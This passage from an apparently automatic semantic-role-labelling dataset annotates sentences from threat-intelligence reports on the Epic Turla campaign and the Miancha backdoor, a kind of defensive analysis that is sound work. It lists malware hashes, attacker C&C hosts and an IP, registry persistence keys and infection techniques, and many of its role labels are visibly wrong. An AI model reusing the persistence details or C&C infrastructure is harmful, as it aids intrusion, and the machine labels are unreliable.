backdoor"}}, "has": {"V": {"text": "has", "index": 29}}, "set": {"ARG1": {"text": "the compilation code page language"}, "V": {"text": "set", "index": 35}, "ARG2": {"text": "to \" LANG_RUSSIAN \""}}, "LANG_RUSSIAN": {"V": {"text": "LANG_RUSSIAN", "index": 38}}}, " Once a victim is confirmed as \"interesting\", the\nattackers upload another Epic backdoor which has a unique ID used to control this specific victim": {"is": {"V": {"text": "is", "index": 3}}, "confirmed": {"ARG1": {"text": "a victim"}, "V": {"text": "confirmed", "index": 4}, "ARG2": {"text": "as \" interesting \""}}, "upload": {"ARGM-TMP": {"text": "Once a victim is confirmed as \" interesting \""}, "ARG0": {"text": "the attackers"}, "V": {"text": "upload", "index": 12}, "ARG1": {"text": "another Epic"}, "ARGM-PRD": {"text": "backdoor/ which has a unique ID used to control this specific victim"}}, "has": {"R-ARG0": {"text": "which"}, "V": {"text": "has", "index": 17}, "ARG1": {"text": "a unique ID used to control this specific victim"}}, "used": {"V": {"text": "used", "index": 21}, "ARG2": {"text": "to control this specific victim"}}, "control": {"V": {"text": "control", "index": 23}, "ARG1": {"text": "this specific victim"}}}, " Sometimes, the attackers register the\n.JPG extension with the PHP handler on the server, using \"JPG\" files to run PHP scripts:\n\n\n\n<figure></figure>\n<caption>Profiling script</caption>\n\nThe main exploitation script \"wreq.php\", \"main.php\" or \"main.jpg\" performs a numbers of tasks": {"register": {"ARGM-TMP": {"text": "Sometimes"}, "ARG0": {"text": "the attackers"}, "V": {"text": "register", "index": 4}, "ARG1": {"text": "the .JPG extension"}, "ARGM-MNR": {"text": "with the PHP handler/ using \" JPG \" files to run PHP scripts : The main exploitation script \" wreq.php \" , \" main.php \" or \" main.jpg \" performs a numbers of tasks"}, "ARGM-LOC": {"text": "on the server"}}, "using": {"ARG0": {"text": "the attackers"}, "V": {"text": "using", "index": 16}, "ARG1": {"text": "\" JPG \" files"}, "ARG2": {"text": "to run PHP scripts : The main exploitation script \" wreq.php \" , \" main.php \" or \" main.jpg \""}}, "run": {"V": {"text": "run", "index": 22}, "ARG1": {"text": "PHP scripts"}}, "performs": {"ARGM-TMP": {"text": "Sometimes"}, "ARG0": {"text": "the attackers/ main.php \" or \" main.jpg"}, "V": {"text": "performs", "index": 41}, "ARG1": {"text": "a numbers of tasks"}}}, "\n\nIt runs a control panel which is password protected:\n\n<figure></figure>\n\n\n<caption>Epic mothership control panel login</caption>\n\nOnce logged into the Control panel, the attackers can see a general overview of the system including the\nnumber of interesting potential targets:\n\n\n<figure></figure>\n\n<caption>Epic control panel status overview</caption>\n\nA very interesting file on the servers is task.css, where the attackers define the IP ranges they are\ninterested in": {"runs": {"ARG0": {"text": "It"}, "V": {"text": "runs", "index": 1}, "ARG1": {"text": "a control panel which is password protected"}}, "is": {"ARG1": {"text": "a control panel"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "password protected"}}, "protected": {"ARG1": {"text": "a control panel"}, "R-ARG1": {"text": "which"}, "ARGM-MNR": {"text": "password"}, "V": {"text": "protected", "index": 8}}, "is_2": {"ARG1": {"text": "A very interesting file on the servers"}, "V": {"text": "is", "index": 17}, "ARG2": {"text": "task.css , where the attackers define the IP ranges they are interested in"}}, "define": {"ARGM-LOC": {"text": "task.css"}, "R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "the attackers"}, "V": {"text": "define", "index": 23}, "ARG1": {"text": "the IP ranges they are interested in"}}, "ranges": {"ARG1": {"text": "the IP"}, "V": {"text": "ranges", "index": 26}, "ARG2": {"text": "they are interested in"}}, "are": {"ARG1": {"text": "they"}, "V": {"text": "are", "index": 28}, "ARG2": {"text": "interested in"}}}, " Most recently, we observed them using yet another technique coupled with\nwatering hole attacks": {"observed": {"ARGM-TMP": {"text": "Most recently"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 4}, "ARG2": {"text": "them"}, "ARG1": {"text": "using yet another technique coupled with watering hole attacks"}}, "using": {"ARG0": {"text": "them"}, "V": {"text": "using", "index": 6}, "ARG1": {"text": "yet another technique coupled with watering hole attacks"}}, "coupled": {"ARG1": {"text": "yet another technique"}, "V": {"text": "coupled", "index": 10}, "ARG2": {"text": "with watering hole attacks"}}, "watering": {"V": {"text": "watering", "index": 12}, "ARG1": {"text": "hole attacks"}}}, "\n\nThe main backdoor is about 60KB in size and implements a C&C protocol on top of normal HTTP\n\frequests": {"is": {"ARG1": {"text": "The main backdoor"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "about 60 KB in size and implements a C&C protocol on top of normal HTTP requests"}}, "implements": {"V": {"text": "implements", "index": 10}, "ARG1": {"text": "a C&C protocol"}, "ARG3": {"text": "on top of normal HTTP requests"}}}, "\n\nThe Turla Carbon dropper from these packages has the following properties:\n<list>\nMD5: cb1b68d9971c2353c2d6a8119c49b51f\n</list>\n\fThis is called internally by the authors \"Carbon System\", part of the \"Cobra\" project, as it can be seen from\nthe debug path inside:\n\n<figure></figure>\n\n\nThis acts as a dropper for the following modules, both 32 and 64 bit:\n<table>\n                MD5                                                     Resource number\n                4c1017de62ea4788c7c8058a8f825a2d                        101\n                43e896ede6fe025ee90f7f27c6d376a4                        102\n                e6d1dcc6c2601e592f2b03f35b06fa8f                        104\n                554450c1ecb925693fedbb9e56702646                        105\n                df230db9bddf200b24d8744ad84d80e8                        161\n                91a5594343b47462ebd6266a9c40abbe                        162\n                244505129d96be57134cb00f27d4359c                        164\n                4ae7e6011b550372d2a73ab3b4d67096                        165\n</table>\nThe Carbon system is in essence an extensible platform, very similar to other attack platforms such as the\nTilded platform or the Flame platform": {"has": {"ARG0": {"text": "The Turla Carbon dropper from these packages"}, "V": {"text": "has", "index": 7}, "ARG1": {"text": "the following properties"}}, "following": {"V": {"text": "following", "index": 9}, "ARG1": {"text": "properties"}}, "is": {"ARG1": {"text": "The Carbon system"}, "V": {"text": "is", "index": 15}, "ARGM-ADV": {"text": "in essence"}, "ARG2": {"text": "an extensible platform , very similar to other attack platforms such as the Tilded platform or the Flame platform"}}}, "\n<figure></figure>\n</section>\n<section>\n\f<heading>Language artifacts</heading>\n\nThe payload recovered from one of the mothership servers (at\nnewsforum.servehttp[.]com/wordpress/wp-includes/css/img/upload.php, MD5:\n4dc22c1695d1f275c3b6e503a1b171f5, Compiled: Thu Sep 06 14:09:55 2012) contains two modules, a\nloader/injector and a backdoor": {"recovered": {"ARG1": {"text": "The payload"}, "V": {"text": "recovered", "index": 2}, "ARG2": {"text": "from one of the mothership servers ("}, "ARGM-ADV": {"text": "at newsforum.servehttp[.]com/wordpress/wp-includes/css/img/upload.php"}}, "contains": {"ARG0": {"text": "Thu Sep 06 14:09:55 2012 )"}, "V": {"text": "contains", "index": 25}, "ARG1": {"text": "two modules , a loader / injector and a backdoor"}}}, " All further\ninformation sent to the C&C is encrypted with a public key framework, making decryption impossible": {"sent": {"ARG1": {"text": "All further information"}, "V": {"text": "sent", "index": 3}, "ARG2": {"text": "to the C&C"}}, "is": {"V": {"text": "is", "index": 7}}, "encrypted": {"ARG1": {"text": "All further information sent to the C&C"}, "V": {"text": "encrypted", "index": 8}, "ARG2": {"text": "with a public key framework"}, "ARGM-ADV": {"text": "making decryption impossible"}}, "making": {"V": {"text": "making", "index": 15}, "ARG1": {"text": "decryption impossible"}}}, " Sometimes, both backdoors are run in tandem, and used to \"rescue\" each other if\ncommunications are lost with one of the backdoors": {"are": {"V": {"text": "are", "index": 4}}, "run": {"ARGM-TMP": {"text": "Sometimes"}, "ARG1": {"text": "both backdoors"}, "V": {"text": "run", "index": 5}, "ARGM-MNR": {"text": "in tandem"}}, "used": {"ARGM-TMP": {"text": "Sometimes"}, "ARG1": {"text": "both backdoors"}, "V": {"text": "used", "index": 10}, "ARG2": {"text": "to \" rescue \" each other"}, "ARGM-ADV": {"text": "if communications are lost with one of the backdoors"}}, "rescue": {"ARG0": {"text": "both backdoors"}, "V": {"text": "rescue", "index": 13}, "ARG1": {"text": "each other"}}, "are_2": {"V": {"text": "are", "index": 19}}, "lost": {"ARG1": {"text": "communications"}, "V": {"text": "lost", "index": 20}, "ARG2": {"text": "with one of the backdoors"}}}, " The\ncommands from the C&C are encrypted in a simpler manner and can be decrypted if intercepted because\nthe secret key is hardcoded in the malware": {"are": {"V": {"text": "are", "index": 5}}, "encrypted": {"ARG1": {"text": "The commands from the C&C"}, "V": {"text": "encrypted", "index": 6}, "ARGM-MNR": {"text": "in a simpler manner"}}, "can": {"V": {"text": "can", "index": 12}}, "be": {"ARG1": {"text": "The commands from the C&C"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 13}, "ARG2": {"text": "decrypted"}, "ARGM-ADV": {"text": "if intercepted"}, "ARGM-CAU": {"text": "because the secret key is hardcoded in the malware"}}, "decrypted": {"ARG1": {"text": "The commands from the C&C"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "decrypted", "index": 14}, "ARGM-ADV": {"text": "if intercepted"}, "ARGM-CAU": {"text": "because the secret key is hardcoded in the malware"}}, "intercepted": {"V": {"text": "intercepted", "index": 16}}, "is": {"ARG1": {"text": "the secret key"}, "V": {"text": "is", "index": 21}, "ARG2": {"text": "hardcoded"}, "ARGM-LOC": {"text": "in the malware"}}, "hardcoded": {"ARG1": {"text": "the secret key"}, "V": {"text": "hardcoded", "index": 22}, "ARGM-LOC": {"text": "in the malware"}}}, " Depending on the\n\"tasks\", they will decide whether to infect the visitors or not": {"Depending": {"V": {"text": "Depending", "index": 0}, "ARG1": {"text": "on the \" tasks \""}}, "will": {"ARGM-ADV": {"text": "Depending on the \" tasks \""}, "ARG0": {"text": "they"}, "V": {"text": "will", "index": 8}, "ARG1": {"text": "decide whether to infect the visitors or not"}}, "decide": {"ARGM-ADV": {"text": "Depending on the \" tasks \""}, "ARG0": {"text": "they"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "decide", "index": 9}, "ARG1": {"text": "whether to infect the visitors or not"}}, "infect": {"ARG0": {"text": "they"}, "V": {"text": "infect", "index": 12}, "ARG1": {"text": "the visitors"}}}, " Contact: intelreports@kaspersky.com\n</section>\n<section>\n<heading>The Epic Turla attacks</heading>\n\nThe attacks in this campaign fall into several different categories depending on the vector used in the\ninitial compromise:\n<list>\n\n      Spearphishing e-mails with Adobe PDF exploits (CVE-2013-3346 + CVE-2013-5065)\n\f      Social engineering to trick the user into running malware installers with \".SCR\" extension,\n      sometimes packed with RAR\n      Watering hole attacks using Java exploits (CVE-2012-1723), Flash exploits (unknown) or Internet\n      Explorer 6,7,8 exploits (unknown)\n      Watering hole attacks that rely on social engineering to trick the user into running fake \"Flash\n      Player\" malware installers\n</list>\nThe attackers use both direct spearphishing and watering hole attacks to infect their victims": {"use": {"ARG0": {"text": "The attackers"}, "V": {"text": "use", "index": 5}, "ARG1": {"text": "both direct spearphishing and watering hole attacks"}, "ARG2": {"text": "to infect their victims"}}, "watering": {"ARG0": {"text": "The attackers"}, "V": {"text": "watering", "index": 10}, "ARG1": {"text": "hole attacks"}, "ARGM-PRP": {"text": "to infect their victims"}}, "infect": {"ARG0": {"text": "The attackers"}, "V": {"text": "infect", "index": 14}, "ARG1": {"text": "their victims"}}}, "\n\nInjected websites load a remote JavaScript into the victim's browser:\n<figure></figure>\n\fThe script \"sitenavigatoin.js\" is a Pinlady-style browser and plugin detection script, which in turn,\nredirects to a PHP script sometimes called main.php or wreq.php": {"load": {"ARG0": {"text": "Injected websites"}, "V": {"text": "load", "index": 2}, "ARG2": {"text": "a remote JavaScript into the victim 's browser"}}, "is": {"ARG1": {"text": "The script \" sitenavigatoin.js \""}, "V": {"text": "is", "index": 17}, "ARG2": {"text": "a Pinlady - style browser and plugin detection script , which in turn , redirects to a PHP script sometimes called main.php or wreq.php"}}, "plugin": {"V": {"text": "plugin", "index": 24}, "ARG1": {"text": "detection script"}}, "redirects": {"ARG0": {"text": "a Pinlady - style browser and plugin detection script"}, "R-ARG0": {"text": "which"}, "ARGM-ADV": {"text": "in turn"}, "V": {"text": "redirects", "index": 32}, "ARG2": {"text": "to a PHP script sometimes called main.php or wreq.php"}}, "called": {"ARG1": {"text": "a PHP script"}, "ARGM-TMP": {"text": "sometimes"}, "V": {"text": "called", "index": 38}, "ARG2": {"text": "main.php or wreq.php"}}}, "\nThere are three possible values:\n<list>\n      TRY\n      DON'T TRY -> Version of the browser and OS does not meet the conditions\n      DON'T TRY -> (2012-09-19 10:02:04) - checktime < 60\n</list>\nThese are the \"don't meet the conditions\" reasons observed in the logs:\n<list>\n      Windows 7 or 2008 R2\n      MSIE 8.0\n      Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR\n      2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E)\n      Adobe Shockwave 11.5.1.601\n      Adobe Flash 10.3.181.14\n      Adobe Reader 10.1.0.0\n      Win Media Player 12.0.7601.17514\n      Quick Time null\n      MS Word null\n      Java null\n</list>\n</section>\n<section>\n<heading>The Epic / Tavdig / Wipbot backdoor</heading>\n\nFor this first stage of the attack, the threat actor uses a custom backdoor": {"are": {"V": {"text": "are", "index": 1}, "ARG1": {"text": "three possible values"}}, "uses": {"ARGM-TMP": {"text": "For this first stage of the attack"}, "ARG0": {"text": "the threat actor"}, "V": {"text": "uses", "index": 17}, "ARG1": {"text": "a custom backdoor"}}}, "\n\nOne such tool observed in the attacks and saved as \"C:\\Documents and Settings\\All users\\Start\nMenu\\Programs\\Startup\\winsvclg.exe\" is:\n<list>\nName: winsvclg.exe\nMD5: a3cbf6179d437909eb532b7319b3dafe\nCompiled: Tue Oct 02 13:51:50 2012\n</list>\nThis is a keylogger tool that creates %temp%\\~DFD3O8.tmp": {"observed": {"ARG1": {"text": "One such tool"}, "V": {"text": "observed", "index": 3}, "ARGM-LOC": {"text": "in the attacks"}}, "saved": {"ARG0": {"text": "One such tool"}, "V": {"text": "saved", "index": 8}, "ARGM-TMP": {"text": "as \" C:\\Documents"}}, "is": {"ARG1": {"text": "One such tool observed in the attacks and saved as \" C:\\Documents and Settings\\All users\\Start Menu\\Programs\\Startup\\winsvclg.exe \""}, "V": {"text": "is", "index": 17}, "ARG2": {"text": "This is a keylogger tool that creates % temp%\\~DFD3O8.tmp"}}, "is_2": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 20}, "ARG2": {"text": "a keylogger tool that creates % temp%\\~DFD3O8.tmp"}}, "creates": {"ARG0": {"text": "a keylogger tool"}, "R-ARG0": {"text": "that"}, "V": {"text": "creates", "index": 25}, "ARG1": {"text": "% temp%\\~DFD3O8.tmp"}}}, "\n\nOne version of this script attempts to exploit Internet Explorer versions 6, 7 and 8:\n<figure></figure>\n\f<caption>Internet Explorer exploitation script</caption>\n\nUnfortunately, the Internet Explorer exploits have not yet been retrieved": {"exploit": {"ARG0": {"text": "this script"}, "V": {"text": "exploit", "index": 7}, "ARG1": {"text": "Internet Explorer versions"}}, "have": {"V": {"text": "have", "index": 23}}, "been": {"V": {"text": "been", "index": 26}}, "retrieved": {"ARG1": {"text": "the Internet Explorer exploits"}, "ARGM-NEG": {"text": "not"}, "ARGM-TMP": {"text": "yet"}, "V": {"text": "retrieved", "index": 27}}}, "\n\nOther packages delivered to the victims include:\n<list>\nMD5: c7617251d523f3bc4189d53df1985ca9\nMD5: 0f76ef2e6572befdc2ca1ca2ab15e5a1\n</list>\nThese top level packages deploy both updated Epic backdoors and Turla Carbon system backdoors to\nconfirmed victims, effectively linking the Epic and Turla Carbon operations together": {"delivered": {"ARG1": {"text": "Other packages"}, "V": {"text": "delivered", "index": 2}, "ARG2": {"text": "to the victims include"}}, "include": {"ARG2": {"text": "Other packages delivered to the victims"}, "V": {"text": "include", "index": 6}, "ARG1": {"text": "These top level packages deploy both updated Epic backdoors and Turla Carbon system backdoors to confirmed victims , effectively linking the Epic and Turla Carbon operations together"}}, "deploy": {"ARG0": {"text": "These top level packages"}, "V": {"text": "deploy", "index": 12}, "ARG1": {"text": "both updated Epic backdoors and Turla Carbon system"}, "ARGM-PRP": {"text": "to confirmed victims"}, "ARGM-PRD": {"text": "effectively linking the Epic and Turla Carbon operations together"}}, "updated": {"V": {"text": "updated", "index": 14}, "ARG1": {"text": "Epic"}}, "confirmed": {"V": {"text": "confirmed", "index": 23}, "ARG1": {"text": "victims"}}, "linking": {"ARGM-MNR": {"text": "effectively"}, "V": {"text": "linking", "index": 27}, "ARG1": {"text": "the Epic and Turla Carbon operations"}, "ARG2": {"text": "together"}}}, "\n\nOnce the attackers obtain the necessary credentials without the victim noticing, they deploy the rootkit\nand other extreme persistence mechanisms": {"obtain": {"ARG0": {"text": "the attackers"}, "V": {"text": "obtain", "index": 3}, "ARG1": {"text": "the necessary credentials"}, "ARGM-MNR": {"text": "without the victim noticing"}}, "deploy": {"ARGM-TMP": {"text": "Once the attackers obtain the necessary credentials without the victim noticing"}, "ARG0": {"text": "they"}, "V": {"text": "deploy", "index": 13}, "ARG1": {"text": "the rootkit and other extreme persistence mechanisms"}}}, " In February 2014 we observed the Miniduke threat actor using the same backdoor\non their hacked servers, although using a much stronger password": {"observed": {"ARGM-TMP": {"text": "In February 2014"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 4}, "ARG1": {"text": "the Miniduke threat actor using the same backdoor on their hacked servers"}, "ARGM-ADV": {"text": "although using a much stronger password"}}, "using": {"ARG0": {"text": "the Miniduke threat actor"}, "V": {"text": "using", "index": 9}, "ARG1": {"text": "the same backdoor"}, "ARGM-LOC": {"text": "on their hacked servers"}}, "hacked": {"V": {"text": "hacked", "index": 15}, "ARG1": {"text": "servers"}}, "using_2": {"V": {"text": "using", "index": 19}, "ARG1": {"text": "a much stronger password"}}}, " These include\nsearches for:\n<list>\n      *NATO*.msg\n      eu energy dialogue*.*\n      EU*.msg\n\f      Budapest*.msg\n</list>\n\nIn this case, the attackers were interested to find e-mails related to \"NATO\", \"Energy Dialogue within\nEuropean Unition\" and so on": {"include": {"ARG2": {"text": "These"}, "V": {"text": "include", "index": 1}, "ARG1": {"text": "searches for"}}, "were": {"ARGM-LOC": {"text": "In this case"}, "ARG1": {"text": "the attackers"}, "V": {"text": "were", "index": 11}, "ARG2": {"text": "interested to find e - mails related to \" NATO \" , \" Energy Dialogue within European Unition \" and so on"}}, "find": {"ARG0": {"text": "the attackers"}, "V": {"text": "find", "index": 14}, "ARG1": {"text": "e - mails related to \" NATO \" , \" Energy Dialogue within European Unition \" and so"}}, "related": {"ARG1": {"text": "e - mails"}, "V": {"text": "related", "index": 18}, "ARG2": {"text": "to \" NATO \" , \" Energy Dialogue within European Unition \" and"}}}, " This drops the malicious file with the\nMD5 7731d42b043865559258464fe1c98513": {"drops": {"ARG0": {"text": "This"}, "V": {"text": "drops", "index": 1}, "ARG1": {"text": "the malicious file with the MD5 7731d42b043865559258464fe1c98513"}}}, " Our analysis indicates that\nvictims are infected via a sophisticated multi-stage attack, which begins with the Epic Turla": {"indicates": {"ARG0": {"text": "Our analysis"}, "V": {"text": "indicates", "index": 2}, "ARG1": {"text": "that victims are infected via a sophisticated multi - stage attack , which begins with the Epic Turla"}}, "are": {"V": {"text": "are", "index": 5}}, "infected": {"ARG1": {"text": "victims"}, "V": {"text": "infected", "index": 6}, "ARG2": {"text": "via a sophisticated multi - stage attack , which begins with the Epic Turla"}}, "begins": {"ARG1": {"text": "a sophisticated multi - stage attack"}, "R-ARG1": {"text": "which"}, "V": {"text": "begins", "index": 16}, "ARG2": {"text": "with the Epic Turla"}}}, " In some cases, the backdoor is\npackaged together with the CVE-2013-5065 EoP exploit and heavily obfuscated": {"is": {"V": {"text": "is", "index": 6}}, "packaged": {"ARGM-LOC": {"text": "In some cases"}, "ARG1": {"text": "the backdoor"}, "V": {"text": "packaged", "index": 7}, "ARGM-PRD": {"text": "together"}, "ARGM-MNR": {"text": "with the CVE-2013 - 5065 EoP exploit and heavily obfuscated"}}, "obfuscated": {"ARGM-EXT": {"text": "heavily"}, "V": {"text": "obfuscated", "index": 18}}}, " The main\nimplant code is referred to as \u767d\u52a0\u9ed1 (\u2018Black on White\u2019), a term used in the PRC hacking\ncommunity to denote the act of Antivirus avoidance through the loading of malicious\n\u2018black\u2019 code via non-malicious or trusted \u2018white\u2018 code": {"is": {"V": {"text": "is", "index": 4}}, "referred": {"V": {"text": "referred", "index": 5}, "ARG1": {"text": "to"}, "ARG2": {"text": "as \u767d\u52a0\u9ed1 ( \u2018 Black on White \u2019 ) , a term used in the PRC hacking community to denote the act of Antivirus avoidance through the loading of malicious \u2018 black \u2019 code via non - malicious or trusted \u2018 white \u2018 code"}}, "used": {"ARG1": {"text": "a term"}, "V": {"text": "used", "index": 19}, "ARGM-LOC": {"text": "in the PRC hacking community"}, "ARG2": {"text": "to denote the act of Antivirus avoidance through the loading of malicious \u2018 black \u2019 code via non - malicious or trusted \u2018 white \u2018 code"}}, "hacking": {"V": {"text": "hacking", "index": 23}, "ARG1": {"text": "community"}}, "denote": {"V": {"text": "denote", "index": 26}, "ARG1": {"text": "the act of Antivirus avoidance"}, "ARG2": {"text": "through the loading of malicious \u2018 black \u2019 code"}, "ARGM-MNR": {"text": "via non - malicious or trusted \u2018 white \u2018 code"}}, "trusted": {"V": {"text": "trusted", "index": 46}, "ARG2": {"text": "\u2018 white \u2018 code"}}}, " The installer is responsible for the malware persistence\nmechanism, adding entries to the registry in the following locations, depending on\nWindows Version:\n<table>\nMiancha Persistence Registry Keys\nWindows Vista and later                     HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{ECD4FC4D-\n                                            5213-11D0-B792-00A0C90312E1}\\InProcServer32\\@ =\n                                            expand:\"C:\\WINDOWS\\temp\\install.ocx\"\nPrior to Windows Vista                      HKEY_USERS\\.default\\Software\\Classes\\CLSID\\{B12AE898-\n                                            D056-4378-A844-6D393FE37956}\\InProcServer32\\@ =\n                                            expand:\"C:\\WINDOWS\\temp\\install.ocx\"\n</table>\nThe installer will also determine the system architecture (32- or 64-bit) and then\ndeobfuscate the relevant loader DLL to the path \u2018C:\\Windows\\temp\\install.ocx\u2019,\nensuring the malware is launched on system start-up": {"is": {"ARG1": {"text": "The installer"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "responsible for the malware persistence mechanism"}, "ARGM-ADV": {"text": "adding entries to the registry in the following locations/ depending on Windows Version : The installer will also determine the system architecture ( 32- or 64-bit ) and then deobfuscate the relevant loader DLL to the path \u2018 C:\\Windows\\temp\\install.ocx \u2019 , ensuring the malware is launched on system start - up"}}, "adding": {"V": {"text": "adding", "index": 10}, "ARG1": {"text": "entries"}, "ARG2": {"text": "to the registry"}, "ARGM-TMP": {"text": "in the following locations"}, "ARGM-ADV": {"text": "depending on Windows Version"}}, "following": {"V": {"text": "following", "index": 17}, "ARG1": {"text": "locations"}}, "depending": {"V": {"text": "depending", "index": 20}, "ARG1": {"text": "on Windows Version"}}, "will": {"V": {"text": "will", "index": 27}}, "determine": {"ARG0": {"text": "The installer"}, "ARGM-MOD": {"text": "will"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "determine", "index": 29}, "ARG1": {"text": "the system architecture ( 32- or 64-bit )"}, "ARGM-PRD": {"text": "ensuring the malware is launched on system start - up"}}, "deobfuscate": {"ARG0": {"text": "The installer"}, "ARGM-MOD": {"text": "will"}, "ARGM-ADV": {"text": "also"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "deobfuscate", "index": 40}, "ARG1": {"text": "the relevant loader DLL"}, "ARG2": {"text": "to the path \u2018 C:\\Windows\\temp\\install.ocx \u2019"}, "ARGM-PRD": {"text": "ensuring the malware is launched on system start - up"}}, "ensuring": {"ARG0": {"text": "The installer"}, "V": {"text": "ensuring", "index": 52}, "ARG1": {"text": "the malware is launched on system start - up"}}, "is_2": {"V": {"text": "is", "index": 55}}, "launched": {"ARG1": {"text": "the malware"}, "V": {"text": "launched", "index": 56}, "ARGM-MNR": {"text": "on system start - up"}}, "start": {"ARG1": {"text": "system"}, "V": {"text": "start", "index": 59}}}, "\n\nThe installer component is referred to by the author as \u2018miansha' which, according to an\nEast Asia Cyber Threat Intelligence Researcher, is likely Mi\u01censh\u0101 (\u514d\u6740), a phrase\ncommonly used by People\u2019s Republic of China (PRC) hackers to mean \u2018anti Antivirus\ndetection\u2019 or \u2018Antivirus avoidance\u2019; Symantec<fn>[3]</fn> have named the detection for this\ncode \u2018Backdoor.Miancha\u2019, where Mi\u01cench\u00e1 (\u514d\u67e5, likely shorthand for \u514d\u6740\u67e5) similarly\nmeans \u2018Antivirus avoidance\u2019": {"is": {"V": {"text": "is", "index": 3}}, "referred": {"V": {"text": "referred", "index": 4}, "ARG1": {"text": "to"}, "ARG0": {"text": "by the author"}, "ARG2": {"text": "as \u2018 miansha '"}, "ARGM-ADV": {"text": "which , according to an East Asia Cyber Threat Intelligence Researcher , is likely Mi\u01censh\u0101 ( \u514d\u6740 ) , a phrase commonly used by People \u2019s Republic of China ( PRC ) hackers to mean \u2018 anti Antivirus detection \u2019 or \u2018 Antivirus avoidance \u2019"}}, "according": {"V": {"text": "according", "index": 15}}, "is_2": {"ARG1": {"text": "\u2018 miansha '"}, "R-ARG1": {"text": "which"}, "ARGM-ADV": {"text": "according to an East Asia Cyber Threat Intelligence Researcher"}, "V": {"text": "is", "index": 25}, "ARG2": {"text": "likely Mi\u01censh\u0101 ( \u514d\u6740 ) , a phrase commonly used by People \u2019s Republic of China ( PRC ) hackers to mean \u2018 anti Antivirus detection \u2019 or \u2018 Antivirus avoidance \u2019"}}, "used": {"ARG1": {"text": "a phrase"}, "ARGM-MNR": {"text": "commonly"}, "V": {"text": "used", "index": 35}, "ARG0": {"text": "by People \u2019s Republic of China ( PRC"}}, "mean": {"ARG0": {"text": "hackers"}, "V": {"text": "mean", "index": 47}, "ARG1": {"text": "\u2018 anti Antivirus detection \u2019 or \u2018 Antivirus avoidance \u2019"}}, "have": {"V": {"text": "have", "index": 60}}, "named": {"ARG1": {"text": "Symantec"}, "V": {"text": "named", "index": 61}, "ARG2": {"text": "the detection for this code \u2018 Backdoor . Miancha \u2019"}}, "means": {"ARGM-ADV": {"text": "according to an East Asia Cyber Threat Intelligence Researcher"}, "R-ARG0": {"text": "where"}, "ARG0": {"text": "likely shorthand for \u514d\u6740\u67e5 )"}, "ARGM-MNR": {"text": "similarly"}, "V": {"text": "means", "index": 84}, "ARG1": {"text": "\u2018 Antivirus avoidance \u2019"}}}, "\nThis specific variant shows similarities to that used during the VOHO campaign<fn>[4]</fn>, where\nGh0st RAT was spread via watering hole attacks utilising vulnerable websites belonging\nto financial services and technology companies": {"shows": {"ARG0": {"text": "This specific variant"}, "V": {"text": "shows", "index": 3}, "ARG1": {"text": "similarities"}}, "used": {"ARG1": {"text": "that"}, "V": {"text": "used", "index": 7}, "ARGM-TMP": {"text": "during the VOHO campaign , where Gh0st RAT was spread via watering hole attacks utilising vulnerable websites belonging to financial services and technology companies"}}, "was": {"V": {"text": "was", "index": 16}}, "spread": {"ARGM-LOC": {"text": "the"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "Gh0st RAT"}, "V": {"text": "spread", "index": 17}, "ARGM-MNR": {"text": "via watering hole attacks utilising vulnerable websites belonging to financial services and technology companies"}}, "watering": {"V": {"text": "watering", "index": 19}, "ARG1": {"text": "hole"}}, "utilising": {"ARG0": {"text": "via/ watering hole attacks"}, "V": {"text": "utilising", "index": 22}, "ARG1": {"text": "vulnerable websites belonging to financial services and technology companies"}}, "belonging": {"ARG0": {"text": "watering hole attacks utilising vulnerable websites"}, "V": {"text": "belonging", "index": 25}, "ARG1": {"text": "to financial services and technology companies"}}}, "\n</section>\n\n\n\n                             <footer>   TLP: WHITE                                        Page 4 / 11</footer>\n\f                     <header>TLP: WHITE</header>\n\n\n<section>\n<heading>\n3 The Monju Incident\n</heading>\n</section>\n<section>\n<heading>3.1 Infection Vector</heading>\nBased on open source reporting, it appears that the intrusion took place via the\ncompromise of the GOM Player update server (app.gomlab.com), where attackers\nmay have gained entry via a PHP-based webshell, hidden within an image, present on\nthe host since October 2011<fn>[2]</fn>": {}, "\nAmong other items, staff training documents and more than 40,000 emails were stored\non the machine and thought to be harvested by the attacker": {"were": {"V": {"text": "were", "index": 12}}, "stored": {"ARGM-LOC": {"text": "Among other items/ on the machine"}, "ARG1": {"text": "staff training documents and more than 40,000 emails"}, "V": {"text": "stored", "index": 13}}, "thought": {"ARGM-ADV": {"text": "Among other items"}, "V": {"text": "thought", "index": 18}, "ARG1": {"text": "to be harvested by the attacker"}}, "be": {"V": {"text": "be", "index": 20}}, "harvested": {"ARG1": {"text": "staff training documents and more than 40,000 emails"}, "V": {"text": "harvested", "index": 21}, "ARG0": {"text": "by the attacker"}}}, " The loader, referred to by the malware author as \u58f3 (shell),\nreads and deobfuscates the main implant code which then communicates with the\nattacker-controlled server at testqweasd.tk (211.43.220.89) on TCP port 443": {"referred": {"V": {"text": "referred", "index": 3}, "ARG0": {"text": "by the malware author"}, "ARG2": {"text": "as \u58f3 ( shell )"}}, "deobfuscates": {"ARG0": {"text": "The loader"}, "ARGM-PRD": {"text": "referred/ to by the malware author as \u58f3 ( shell )"}, "V": {"text": "deobfuscates", "index": 17}, "ARG1": {"text": "the main implant code which then communicates with the attacker - controlled server at testqweasd.tk ( 211.43.220.89 ) on TCP port 443"}}, "communicates": {"ARG1": {"text": "the main implant code"}, "R-ARG1": {"text": "which"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "communicates", "index": 24}, "ARG2": {"text": "with the attacker - controlled server"}, "ARGM-LOC": {"text": "at testqweasd.tk ( 211.43.220.89"}}, "controlled": {"ARG0": {"text": "attacker"}, "V": {"text": "controlled", "index": 29}, 